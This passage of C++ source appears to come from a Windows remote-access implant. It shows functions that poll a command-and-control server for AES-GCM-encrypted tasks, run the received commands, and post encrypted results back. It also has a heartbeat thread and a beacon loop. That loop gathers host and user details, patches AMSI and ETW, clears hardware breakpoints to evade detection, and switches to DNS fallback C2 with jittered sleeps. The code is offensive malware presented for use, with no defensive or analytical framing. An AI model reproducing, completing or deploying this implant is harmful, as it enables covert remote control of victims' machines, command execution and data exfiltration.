    std::string encCmd = JsonGetString(resp.body, "enc");
    if (!encCmd.empty() && !g_SessionKey.empty()) {
        std::string decrypted = AesGcmDecrypt(g_SessionKey, encCmd);
        cmd = JsonGetString(decrypted, "cmd");
    } else {
        cmd = JsonGetString(resp.body, "cmd");
    }

    if (!cmd.empty()) {
        taskOut = UTF8ToWString(cmd);
        DebugLog(L"Task received: " + taskOut);
    }
    return TRUE;
}

// =====================================================================
//  SEND RESULT
// =====================================================================
BOOL SendResult(const std::wstring& sessionId, const std::wstring& output) {
    std::string sid = JsonEscape(WStringToUTF8(sessionId));
    std::string out = JsonEscape(WStringToUTF8(output));
    std::string plainBody = "{\"session\":\"" + sid +
                            "\",\"output\":\"" + out + "\"}";

    std::string encBody = g_SessionKey.empty() ?
        plainBody :
        "{\"session\":\"" + sid + "\",\"enc\":\"" + AesGcmEncrypt(g_SessionKey, plainBody) + "\"}";

    std::wstring host = GetC2Host();
    HttpResponse resp = WinHttpRequest(host, config::C2_PORT,
                                       L"POST", L"/result", encBody, L"");
    return (resp.status == 200);
}

// =====================================================================
//  HEARTBEAT THREAD
// =====================================================================
static DWORD WINAPI HeartbeatThread(LPVOID) {
    Sleep(30000);
    std::wstring host = GetC2Host();
    while (true) {
        HttpResponse resp = WinHttpRequest(
            host, config::C2_PORT, L"GET", L"/ping", "", L"");
        if (resp.status == 200) {
            DebugLog(L"Heartbeat: OK");
        } else {
            DebugLog(L"Heartbeat: no response (status=" +
                     std::to_wstring(resp.status) + L")");
        }
        Sleep(120000);
    }
    return 0;
}

// =====================================================================
//  MAIN BEACON LOOP
// =====================================================================
VOID BeaconLoop() {
    DebugLog(L"BeaconLoop started");
    g_SessionKey = GenerateSessionKey();

    Session session;
    session.hostname      = GetHostname();
    session.username      = GetUsername();
    session.build         = GetOSBuild();
    session.elevated      = IsElevated();
    session.amsiPatched   = PatchAMSI();
    session.etwPatched    = PatchETW();
    session.hwbpsCleared  = ClearHardwareBreakpoints();
    session.sessionId     = GetHostnameHash() + L"|" + session.username;

    g_SessionId = session.sessionId;
    DebugLog(L"Session: " + session.sessionId);

    HANDLE hHb = CreateThread(nullptr, 0, HeartbeatThread, nullptr, 0, nullptr);
    if (hHb) CloseHandle(hHb);

    DWORD failures    = 0;
    bool  dnsMode     = false;
    bool  firstBeacon = true;

    while (true) {
        try {
            ReapplyEvasion();
            std::wstring task;
            BOOL ok = FALSE;

            if (!dnsMode) {
                ok = SendBeacon(session, task, firstBeacon);
            }

            if (!ok) {
                ++failures;
                DebugLog(L"Beacon failure #" + std::to_wstring(failures));
                if (failures >= config::MAX_FAILURES) {
                    dnsMode = true;
                    DebugLog(L"Switching to DNS fallback C2");
                    std::string dnsCmd = DnsQueryCommand(session.sessionId);
                    if (!dnsCmd.empty()) {
                        task = UTF8ToWString(dnsCmd);
                        ok   = TRUE;
                    }
                }
            } else {
                firstBeacon = false;
                if (failures > 0 && !dnsMode) failures = 0;
                dnsMode = false;
            }

            if (ok) {
                if (task == L"sleep" || task.empty()) {
                    // no-op
                } else if (task == L"exit") {
                    DebugLog(L"Exit received.");
                    return;
                } else {
                    std::wstring result = ExecuteCommand(task);
                    SendResult(session.sessionId, result);
                }
            }

            DWORD sleepMin = config::BEACON_MIN;
            DWORD sleepMax = config::BEACON_MAX;
            if (failures >= config::MAX_FAILURES) {
                sleepMin *= config::BACKOFF_FACTOR;
                sleepMax *= config::BACKOFF_FACTOR;
            }
            if (dnsMode) {
                Sleep(60000);
            } else {
                JitterSleep(sleepMin, sleepMax);
            }
        } catch (const std::exception& e) {
            DebugLog(L"BeaconLoop exception: " + UTF8ToWString(e.what()));
            Sleep(10000);
        } catch (...) {
            DebugLog(L"BeaconLoop: unknown exception, restarting in 10s");
            Sleep(10000);
        }
    }
}